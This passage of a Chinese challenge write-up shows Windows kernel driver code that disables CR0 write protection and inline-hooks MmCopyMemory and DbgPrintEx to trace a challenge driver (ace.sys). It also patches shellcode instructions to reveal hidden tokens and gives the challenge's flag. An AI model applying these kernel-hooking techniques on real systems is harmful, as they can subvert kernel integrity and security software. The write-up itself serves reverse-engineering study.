/>{<br />    KIRQL irql = KeRaiseIrqlToDpcLevel();<br />    UINT64 cr0 = __readcr0();<br />    cr0 &amp;= <span style="color: rgb(255, 115, 253);">0xfffffffffffeffff</span>;<br />    __writecr0(cr0);<br />    _disable();<br />    <span style="color: rgb(150, 203, 254);">return</span> irql;<br />}<br /><br /><span style="color: rgb(255, 255, 182);">void</span> WPONx64(KIRQL irql)<br />{<br />    UINT64 cr0 = __readcr0();<br />    cr0 |= <span style="color: rgb(255, 115, 253);">0x10000</span>;<br />    _enable();<br />    __writecr0(cr0);<br />    KeLowerIrql(irql);<br />}<br /><br />NTSTATUS Unhook() {<br />    KIRQL irql = WPOFFx64();<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; <span style="color: rgb(150, 203, 254);">sizeof</span>(newcode); i++) {<br />        target[i] = oldcode[i];<br />    }<br />    WPONx64(irql);<br />    <span style="color: rgb(150, 203, 254);">return</span> STATUS_SUCCESS;<br />}<br /><br />NTSTATUS Hook() {<br />    KIRQL irql = WPOFFx64();<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; <span style="color: rgb(150, 203, 254);">sizeof</span>(newcode); i++) {<br />        target[i] = newcode[i];<br />    }<br />    WPONx64(irql);<br />    <span style="color: rgb(150, 203, 254);">return</span> STATUS_SUCCESS;<br />}<br /><span style="color: rgb(150, 203, 254);">typedef</span> NTSTATUS(*Copy)(PVOID, MM_COPY_ADDRESS, SIZE_T, ULONG, SIZE_T *);<br /><br />PDRIVER_OBJECT g_Object = <span style="color: rgb(198, 197, 254);">NULL</span>;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> _LDR_DATA_TABLE_ENTRY {<br />    LIST_ENTRY InLoadOrderLinks;<br />    LIST_ENTRY InMemoryOrderLinks;<br />    LIST_ENTRY InInitializationOrderLinks;<br />    PVOID DllBase;<br />    PVOID EntryPoint;<span style="color: rgb(146, 255, 184);">//驱动的进入点 DriverEntry  </span><br />    ULONG SizeOfImage;<br />    UNICODE_STRING FullDllName;<span style="color: rgb(146, 255, 184);">//驱动的满路径  </span><br />    UNICODE_STRING BaseDllName;<span style="color: rgb(146, 255, 184);">//不带路径的驱动名字  </span><br />    ULONG Flags;<br />    USHORT LoadCount;<br />    USHORT TlsIndex;<br />    <span style="color: rgb(150, 203, 254);">union</span> {<br />        LIST_ENTRY HashLinks;<br />        <span style="color: rgb(150, 203, 254);">struct</span> {<br />            PVOID SectionPointer;<br />            ULONG CheckSum;<br />        };<br />    };<br />    <span style="color: rgb(150, 203, 254);">union</span> {<br />        <span style="color: rgb(150, 203, 254);">struct</span> {<br />            ULONG TimeDateStamp;<br />        };<br />        <span style="color: rgb(150, 203, 254);">struct</span> {<br />            PVOID LoadedImports;<br />        };<br />    };<br />} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;<br /><br />VOID bianliqudongmokuai(PUNICODE_STRING name, UINT64* pBaseAddr,UINT64* pSize)<br />{<br />    LDR_DATA_TABLE_ENTRY *TE, *Tmp;<br />    TE = (LDR_DATA_TABLE_ENTRY*)g_Object-&gt;DriverSection;<br />    PLIST_ENTRY LinkList;<br />    ;<br />    <span style="color: rgb(255, 255, 182);">int</span> i = <span style="color: rgb(255, 115, 253);">0</span>;<br />    LinkList = TE-&gt;InLoadOrderLinks.Flink;  <br />    <span style="color: rgb(150, 203, 254);">while</span> (LinkList != &amp;TE-&gt;InLoadOrderLinks)<br />    {<br />        Tmp = (LDR_DATA_TABLE_ENTRY*)LinkList;<br />        <span style="color: rgb(150, 203, 254);">if</span> (RtlCompareUnicodeString(&amp;Tmp-&gt;BaseDllName, name, <span style="color: rgb(198, 197, 254);">FALSE</span>))<br />        {<br />        }<br />        <span style="color: rgb(150, 203, 254);">else</span><br />        {<br />            kprintf((<span style="color: rgb(168, 255, 96);">"Found Module!\n"</span>));<br />            *pBaseAddr = (UINT64)(Tmp-&gt;DllBase);<br />            *pSize = (UINT64)(Tmp-&gt;SizeOfImage);<br />        }<br />        LinkList = LinkList-&gt;Flink;<br />        i++;<br />    }<br /><br />}<br /><br />NTSTATUS<br />    myMmCopyMemory(<br />    _In_ PVOID TargetAddress,<br />    _In_ MM_COPY_ADDRESS SourceAddress,<br />    _In_ SIZE_T NumberOfBytes,<br />    _In_ ULONG Flags,<br />    _Out_ PSIZE_T NumberOfBytesTransferred<br />) {<br /><br />    <span style="color: rgb(150, 203, 254);">if</span> (!BaseAddr) {<br />        UNICODE_STRING name;<br />        RtlInitUnicodeString(&amp;name, L<span style="color: rgb(168, 255, 96);">"ace.sys"</span>);<br />        bianliqudongmokuai(&amp;name,&amp;BaseAddr,&amp;DLLSize);<br />        <span style="color: rgb(150, 203, 254);">if</span> (!BaseAddr) {<br />            <span style="color: rgb(150, 203, 254);">goto</span> end;<br />        }<br />    }<br /><br />    PVOID backtrace[MAX_BACKTRACE_DEPTH];<br />    USHORT capturedFrames = RtlCaptureStackBackTrace(<span style="color: rgb(255, 115, 253);">0</span>, MAX_BACKTRACE_DEPTH, backtrace, <span style="color: rgb(198, 197, 254);">NULL</span>);<br />    UINT64 addr = BaseAddr;<br />    UINT64 size = DLLSize;<br />    <span style="color: rgb(255, 255, 182);">int</span> flag = <span style="color: rgb(255, 115, 253);">0</span>;<br /><br />    <span style="color: rgb(150, 203, 254);">for</span> (USHORT i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; capturedFrames; i++)<br />    {<br />        <span style="color: rgb(150, 203, 254);">if</span> (backtrace[i] &gt;= addr &amp;&amp; backtrace[i] &lt;= addr + size) {<br />            flag = <span style="color: rgb(255, 115, 253);">1</span>;<br />        }<br />    }<br />    <span style="color: rgb(150, 203, 254);">if</span> (flag) {<br />        kprintf((<span style="color: rgb(168, 255, 96);">"xia0ji233: calls MmCopyMemory(%p,%p,%d,%p,%p)\n"</span>), TargetAddress, SourceAddress, NumberOfBytes, Flags, NumberOfBytesTransferred);<br />        kprintf((<span style="color: rgb(168, 255, 96);">"Here is data: "</span>));<br />        <span style="color: rgb(150, 203, 254);">for</span> (INT64 i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; NumberOfBytes; i++) {<br />            kprintf((<span style="color: rgb(168, 255, 96);">"%02x "</span>), *((<span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">char</span>*)SourceAddress.VirtualAddress + i));<br />        }<br />        kprintf((<span style="color: rgb(168, 255, 96);">"\n"</span>));<br />    }<br /><br />    end:<br />    Unhook();<br />    Copy func = (Copy)target;<br />    NTSTATUS s = func(TargetAddress, SourceAddress, NumberOfBytes, Flags, NumberOfBytesTransferred);<br />    Hook();<br /><br />    <span style="color: rgb(150, 203, 254);">return</span> s;<br />}<br /><br /><span style="color: rgb(255, 255, 182);">void</span> DriverUnload(PDRIVER_OBJECT pDriver) {<br />    kprintf((<span style="color: rgb(168, 255, 96);">"Line %d:xia0ji233: start unload\n"</span>), __LINE__);<br />    Unhook();<br />    DeleteDevice(pDriver);<br />}<br /><br />NTSTATUS DriverEntry(<br />    _In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath<br />) {<br />    DriverObject-&gt;DriverUnload = DriverUnload;<br />    CreateDevice(DriverObject);<br />    kprintf((<span style="color: rgb(168, 255, 96);">"Line %d:xia0ji233: RegistryPath = %S\n"</span>), __LINE__, RegistryPath-&gt;Buffer);<br />    target = MmCopyMemory;<br />    kprintf((<span style="color: rgb(168, 255, 96);">"Line %d:xia0ji233: MmCopyMemory=%p\n"</span>), __LINE__, target);<br />    g_Object = DriverObject;<br />    <span style="color: rgb(150, 203, 254);">if</span> (target) {<br />        <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; <span style="color: rgb(150, 203, 254);">sizeof</span>(oldcode); i++) {<br />            oldcode[i] = target[i];<br />        }<br />        *(UINT64*)(newcode + <span style="color: rgb(255, 115, 253);">2</span>) = myMmCopyMemory;<br />        Hook();<br />    }<br />    <span style="color: rgb(150, 203, 254);">else</span> {<br />        kprintf((<span style="color: rgb(168, 255, 96);">"xia0ji233:hahaha"</span>));<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />}</code></pre><p>结果直接没有调用过。后面还同样的方法 hook 了其它的 API，诸如 KeStackAttachProcess 的，同样没有调用，于是陷入沉思，既然它没有把 token 写到 r3 那大概率在 r0 层。</p><p>同时在一次巧合中（开了 DbgView 的 verbose），发现 token 直接打印出来了。</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=749e0eb5&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJp2YT7jeqyL7chY7ZROibib3Df1WVQG4Nq6tYk36U19EBvODHdiaYkcGWf79YicmY2j8Of5QEHTh1ZEw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>那么 token2 就出来了 <code style="font-family: SFMono-Regular, Consolas, ;">token2: 8b3f14a24d64f3e697957c252e3a5686</code></p><p>所以 flag 就是 <code style="font-family: SFMono-Regular, Consolas, ;">flag{757F4749AEBB1891EF5AC2A9B5439CEA-8b3f14a24d64f3e697957c252e3a5686}</code></p><h4>编写程序，运行时修改尽量少的内存，让两段token输出成功。（满分2分）</h4><p>首先看看内核层的输出吧，因为它本来就可以输出，直接调用的 DbgPrintEx 函数，只不过某个 Level 无法正常被接受罢了，尝试 hook 一下，看看 Level</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;ntifs.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;ntdef.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;ntstatus.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;ntddk.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> MAX_BACKTRACE_DEPTH 20</span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> SYMBOL L<span style="color: rgb(168, 255, 96);">"\\??\\xia0ji2333"</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span><br /><br />UINT64 BaseAddr=<span style="color: rgb(198, 197, 254);">NULL</span>, DLLSize=<span style="color: rgb(255, 115, 253);">0</span>;<br /><br /><span style="color: rgb(255, 255, 182);">void</span> DeleteDevice(PDRIVER_OBJECT pDriver) {<br />    kprintf((<span style="color: rgb(168, 255, 96);">"Line %d:xia0ji233: start delete device\n"</span>), __LINE__);<br />    <span style="color: rgb(150, 203, 254);">if</span> (pDriver-&gt;DeviceObject) {<br />        UNICODE_STRING Sym;<br />        RtlInitUnicodeString(&amp;Sym, SYMBOL);<span style="color: rgb(146, 255, 184);">//CreateFile </span><br />        kprintf((<span style="color: rgb(168, 255, 96);">"Line %d:xia0ji233: Delete Symbol\n"</span>), __LINE__);<br />        IoDeleteSymbolicLink(&amp;Sym);<br />        kprintf((<span style="color: rgb(168, 255, 96);">"Line %d:xia0ji233: Delete Device\n"</span>), __LINE__);<br />        IoDeleteDevice(pDriver-&gt;DeviceObject);<br />    }<br />    kprintf((<span style="color: rgb(168, 255, 96);">"Line %d:xia0ji233: end delete device\n"</span>), __LINE__);<br />}<br /><br /><span style="color: rgb(255, 255, 182);">char</span> newcode[] = {<br />    <span style="color: rgb(255, 115, 253);">0x48</span>,<span style="color: rgb(255, 115, 253);">0xB8</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(146, 255, 184);">//mov rax,xxx</span><br />    <span style="color: rgb(255, 115, 253);">0xFF</span>,<span style="color: rgb(255, 115, 253);">0xE0</span><span style="color: rgb(146, 255, 184);">//jmp rax</span><br />};<br /><span style="color: rgb(255, 255, 182);">char</span> oldcode[] = {<br />    <span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<br />    <span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<br />};<br /><br /><span style="color: rgb(255, 255, 182);">char</span> *target;<br /><br />KIRQL WPOFFx64()<br />{<br />    KIRQL irql = KeRaiseIrqlToDpcLevel();<br />    UINT64 cr0 = __readcr0();<br />    cr0 &amp;= <span style="color: rgb(255, 115, 253);">0xfffffffffffeffff</span>;<br />    __writecr0(cr0);<br />    _disable();<br />    <span style="color: rgb(150, 203, 254);">return</span> irql;<br />}<br /><br /><span style="color: rgb(255, 255, 182);">void</span> WPONx64(KIRQL irql)<br />{<br />    UINT64 cr0 = __readcr0();<br />    cr0 |= <span style="color: rgb(255, 115, 253);">0x10000</span>;<br />    _enable();<br />    __writecr0(cr0);<br />    KeLowerIrql(irql);<br />}<br /><br />NTSTATUS Unhook() {<br />    KIRQL irql = WPOFFx64();<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; <span style="color: rgb(150, 203, 254);">sizeof</span>(newcode); i++) {<br />        target[i] = oldcode[i];<br />    }<br />    WPONx64(irql);<br />    <span style="color: rgb(150, 203, 254);">return</span> STATUS_SUCCESS;<br />}<br /><br />NTSTATUS Hook() {<br />    KIRQL irql = WPOFFx64();<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; <span style="color: rgb(150, 203, 254);">sizeof</span>(newcode); i++) {<br />        target[i] = newcode[i];<br />    }<br />    WPONx64(irql);<br />    <span style="color: rgb(150, 203, 254);">return</span> STATUS_SUCCESS;<br />}<br /><br />PDRIVER_OBJECT g_Object = <span style="color: rgb(198, 197, 254);">NULL</span>;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> _LDR_DATA_TABLE_ENTRY {<br />    LIST_ENTRY InLoadOrderLinks;<br />    LIST_ENTRY InMemoryOrderLinks;<br />    LIST_ENTRY InInitializationOrderLinks;<br />    PVOID DllBase;<br />    PVOID EntryPoint;<span style="color: rgb(146, 255, 184);">//驱动的进入点 DriverEntry  </span><br />    ULONG SizeOfImage;<br />    UNICODE_STRING FullDllName;<span style="color: rgb(146, 255, 184);">//驱动的满路径  </span><br />    UNICODE_STRING BaseDllName;<span style="color: rgb(146, 255, 184);">//不带路径的驱动名字  </span><br />    ULONG Flags;<br />    USHORT LoadCount;<br />    USHORT TlsIndex;<br />    <span style="color: rgb(150, 203, 254);">union</span> {<br />        LIST_ENTRY HashLinks;<br />        <span style="color: rgb(150, 203, 254);">struct</span> {<br />            PVOID SectionPointer;<br />            ULONG CheckSum;<br />        };<br />    };<br />    <span style="color: rgb(150, 203, 254);">union</span> {<br />        <span style="color: rgb(150, 203, 254);">struct</span> {<br />            ULONG TimeDateStamp;<br />        };<br />        <span style="color: rgb(150, 203, 254);">struct</span> {<br />            PVOID LoadedImports;<br />        };<br />    };<br />} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;<br /><br />VOID bianliqudongmokuai(PUNICODE_STRING name, UINT64* pBaseAddr,UINT64* pSize)<br />{<br />    LDR_DATA_TABLE_ENTRY *TE, *Tmp;<br />    TE = (LDR_DATA_TABLE_ENTRY*)g_Object-&gt;DriverSection;<br />    PLIST_ENTRY LinkList;<br />    ;<br />    <span style="color: rgb(255, 255, 182);">int</span> i = <span style="color: rgb(255, 115, 253);">0</span>;<br />    LinkList = TE-&gt;InLoadOrderLinks.Flink;  <br />    <span style="color: rgb(150, 203, 254);">while</span> (LinkList != &amp;TE-&gt;InLoadOrderLinks)<br />    {<br />        Tmp = (LDR_DATA_TABLE_ENTRY*)LinkList;<br />        <span style="color: rgb(150, 203, 254);">if</span> (RtlCompareUnicodeString(&amp;Tmp-&gt;BaseDllName, name, <span style="color: rgb(198, 197, 254);">FALSE</span>))<br />        {<br />        }<br />        <span style="color: rgb(150, 203, 254);">else</span><br />        {<br />            kprintf((<span style="color: rgb(168, 255, 96);">"Found Module!\n"</span>));<br />            *pBaseAddr = (UINT64)(Tmp-&gt;DllBase);<br />            *pSize = (UINT64)(Tmp-&gt;SizeOfImage);<br />        }<br />        LinkList = LinkList-&gt;Flink;<br />        i++;<br />    }<br /><br />}<br /><br /><span style="color: rgb(150, 203, 254);">typedef</span> ULONG(*FuncPtr) (ULONG ComponentId,ULONG Level, PCSTR Format, ...);<br /><br />ULONG  myDbgPrintEx( ULONG ComponentId,ULONG Level,PCSTR Format, ... ) {<br /><br />    Unhook();<br />    FuncPtr func = (FuncPtr)target;<br />    kprintf((<span style="color: rgb(168, 255, 96);">"call DbgPrintEx(%p,%p,%p)"</span>), ComponentId, Level, Format);<br />    DbgBreakPoint();<br />    NTSTATUS s = func(ComponentId,Level,Format);<br /><br />    Hook();<br /><br />    <span style="color: rgb(150, 203, 254);">return</span> s;<br />}<br /><br /><span style="color: rgb(255, 255, 182);">void</span> DriverUnload(PDRIVER_OBJECT pDriver) {<br />    kprintf((<span style="color: rgb(168, 255, 96);">"Line %d:xia0ji233: start unload\n"</span>), __LINE__);<br />    Unhook();<br />    DeleteDevice(pDriver);<br />}<br /><br />NTSTATUS DriverEntry(<br />    _In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath<br />) {<br />    DriverObject-&gt;DriverUnload = DriverUnload;<br />    kprintf((<span style="color: rgb(168, 255, 96);">"Line %d:xia0ji233: RegistryPath = %S\n"</span>), __LINE__, RegistryPath-&gt;Buffer);<br />    target = DbgPrintEx;<br />    kprintf((<span style="color: rgb(168, 255, 96);">"Line %d:xia0ji233: DbgPrintEx=%p\n"</span>), __LINE__, target);<br />    g_Object = DriverObject;<br />    <span style="color: rgb(150, 203, 254);">if</span> (target) {<br />        <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; <span style="color: rgb(150, 203, 254);">sizeof</span>(oldcode); i++) {<br />            oldcode[i] = target[i];<br />        }<br />        *(UINT64*)(newcode + <span style="color: rgb(255, 115, 253);">2</span>) = myDbgPrintEx;<br />        Hook();<br />    }<br />    <span style="color: rgb(150, 203, 254);">else</span> {<br />        kprintf((<span style="color: rgb(168, 255, 96);">"xia0ji233:hahaha"</span>));<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />}</code></pre><p>持续输出了 <code style="font-family: SFMono-Regular, Consolas, ;">call DbgPrintEx(0000000000000000,0000000000000005,FFFFF1001067EB90)</code> Level=5几乎不能输出任何内容了，因此尝试hook替换让它可以输出，但是这里 Hook 还是太麻烦了，于是我选择打下断点之后栈回溯一下看看情况</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=0d96893a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJp2YT7jeqyL7chY7ZROibib3C5cA7UkK53BnSClEIrCbEp00DTA6RfaDLD8m0AyOVdHIjQaYroX2ibw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>可以发现关键 call 之前，有对 edx 赋值为 5，那么直接修改这个指令，把 hook 解掉看看能否输出。</p><p>这里我选择手动改一下，一共发现了三个位置，特征都是差不多的，都把 <code style="font-family: SFMono-Regular, Consolas, ;">mov edx,5</code> 改成 <code style="font-family: SFMono-Regular, Consolas, ;">mov edx,0</code>。</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=ee502c27&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJp2YT7jeqyL7chY7ZROibib3FqvJ6jIJGuhicfhFOshEOhQdK2cwxtdzs99zL19LGQVdkvyJveN6qxA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>发现改完之后 token 成功输出了。</p><p>但是这里应该是驱动加载时候分配的内存写入的 shellcode，如果能知道地址，那么能去改掉这些指令，但是地址是我通过栈回溯找到的，如果没有hook掉系统 API，那么我根本不太可能去获取到shellcode的地址。于是想到它既然是不停地在打印的，必然创建了一个内核线程，那么我先遍历一下内核线程。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;ntddk.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span><br />NTSTATUS <span style="color: rgb(255, 255, 182);">DriverEntry</span>(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath);<br />VOID <span style="color: rgb(255, 255, 182);">UnloadDriver</span>(PDRIVER_OBJECT DriverObject);<br />NTSTATUS <span style="color: rgb(255, 255, 182);">EnumerateKernelThreads</span>();<br /><br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(255, 255, 182);">NTSTATUS</span> (*ZWQUERYSYSTEMINFORMATION)(ULONG, PVOID, ULONG, PULONG);<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">_SYSTEM_PROCESS_INFORMATION</span> {<br />    ULONG NextEntryOffset;<br />    ULONG NumberOfThreads;<br />    LARGE_INTEGER Reserved[<span style="color: rgb(255, 115, 253);">3</span>];<br />    LARGE_INTEGER CreateTime;<br />    LARGE_INTEGER UserTime;<br />    LARGE_INTEGER KernelTime;<br />    UNICODE_STRING ImageName;<br />    ULONG BasePriority;<br />    HANDLE ProcessId;<br />    HANDLE InheritedFromProcessId;<br />} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">_SYSTEM_THREAD_INFORMATION</span> {<br />    LARGE_INTEGER KernelTime;<br />    LARGE_INTEGER UserTime;<br />    LARGE_INTEGER CreateTime;<br />    ULONG WaitTime;<br />    PVOID StartAddress;<br />    CLIENT_ID ClientId;<br />    ULONG Priority;<br />    LONG BasePriority;<br />    ULONG ContextSwitchCount;<br />    LONG State;<br />    LONG WaitReason;<br />} SYSTEM_THREAD_INFORMATION, *PSYSTEM_THREAD_INFORMATION;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">enum</span> <span style="color: rgb(255, 255, 182);">_SYSTEM_INFORMATION_CLASS</span> {<br />    SystemProcessInformation = <span style="color: rgb(255, 115, 253);">5</span><br />} SYSTEM_INFORMATION_CLASS;<br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> SystemModuleInformation 11</span><br /><br />NTSTATUS <span style="color: rgb(255, 255, 182);">DriverEntry</span>(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {<br />    UNREFERENCED_PARAMETER(RegistryPath);<br />    DriverObject-&gt;DriverUnload = UnloadDriver;<br />    kprintf((<span style="color: rgb(168, 255, 96);">"Driver Loaded\n"</span>));<br />    <span style="color: rgb(150, 203, 254);">return</span> EnumerateKernelThreads();<br />}<br /><br />VOID <span style="color: rgb(255, 255, 182);">UnloadDriver</span>(PDRIVER_OBJECT DriverObject) {<br />    UNREFERENCED_PARAMETER(DriverObject);<br />    kprintf((<span style="color: rgb(168, 255, 96);">"Driver Unloaded\n"</span>));<br />}<br /><br />NTSTATUS <span style="color: rgb(255, 255, 182);">EnumerateKernelThreads</span>() {<br />    UNICODE_STRING routineName;<br />    RtlInitUnicodeString(&amp;routineName, <span style="color: rgb(168, 255, 96);">L"ZwQuerySystemInformation"</span>);<br />    ZWQUERYSYSTEMINFORMATION ZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)MmGetSystemRoutineAddress(&amp;routineName);<br />    <span style="color: rgb(150, 203, 254);">if</span> (!ZwQuerySystemInformation) {<br />        <span style="color: rgb(150, 203, 254);">return</span> STATUS_UNSUCCESSFUL;<br />    }<br />    ULONG returnLength = <span style="color: rgb(255, 115, 253);">0</span>;<br />    ZwQuerySystemInformation(SystemProcessInformation, <span style="color: rgb(198, 197, 254);">NULL</span>, <span style="color: rgb(255, 115, 253);">0</span>, &amp;returnLength);<br />    PVOID buffer = ExAllocatePool(NonPagedPool, returnLength);<br />    <span style="color: rgb(150, 203, 254);">if</span> (!buffer) {<br />        <span style="color: rgb(150, 203, 254);">return</span> STATUS_INSUFFICIENT_RESOURCES;<br />    }<br />    NTSTATUS status = ZwQuerySystemInformation(SystemProcessInformation, buffer, returnLength, &amp;returnLength);<br />    <span style="color: rgb(150, 203, 254);">if</span> (!NT_SUCCESS(status)) {<br />        ExFreePool(buffer);<br />        <span style="color: rgb(150, 203, 254);">return</span> status;<br />    }<br />    PSYSTEM_PROCESS_INFORMATION current = (PSYSTEM_PROCESS_INFORMATION)buffer;<br />    <span style="color: rgb(150, 203, 254);">while</span> (TRUE) {<br />        PSYSTEM_THREAD_INFORMATION threadInfo = (PSYSTEM_THREAD_INFORMATION)(current + <span style="color: rgb(255, 115, 253);">1</span>);<br />        <span style="color: rgb(150, 203, 254);">for</span> (ULONG i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; current-&gt;NumberOfThreads; i++) {<br /><br />            <span style="color: rgb(150, 203, 254);">if</span> (((UINT64)(threadInfo-&gt;StartAddress) &amp; <span style="color: rgb(255, 115, 253);">0xFFFF000000000000</span>) == <span style="color: rgb(255, 115, 253);">0xFFFF000000000000</span>) {<br />                 kprintf((<span style="color: rgb(168, 255, 96);">"Thread StartAddress: %p\n"</span>), threadInfo-&gt;StartAddress);<br />            }<br /><br />            threadInfo++;<br />        }<br /><br />        <span style="color: rgb(150, 203, 254);">if</span> (current-&gt;NextEntryOffset == <span style="color: rgb(255, 115, 253);">0</span>)<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br /><br />        current = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)current + current-&gt;NextEntryOffset);<br />    }<br /><br />    ExFreePool(buffer);<br />    <span style="color: rgb(150, 203, 254);">return</span> STATUS_SUCCESS;<br />}</code></pre><p>在中间我判断了一下地址是否为 <code style="font-family: SFMono-Regular, Consolas, ;">0xFFFF</code> 开头来判断是否为内核线程，然后打印出来之后，搜索通过栈回溯得到的 shellcode 的前几位。</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=c4738049&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJp2YT7jeqyL7chY7ZROibib3ddsR4rMxN24wbeQXm9sV11HLEib5jNNxdialjvzV9aXlibsWiadSsrmc7Q%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" 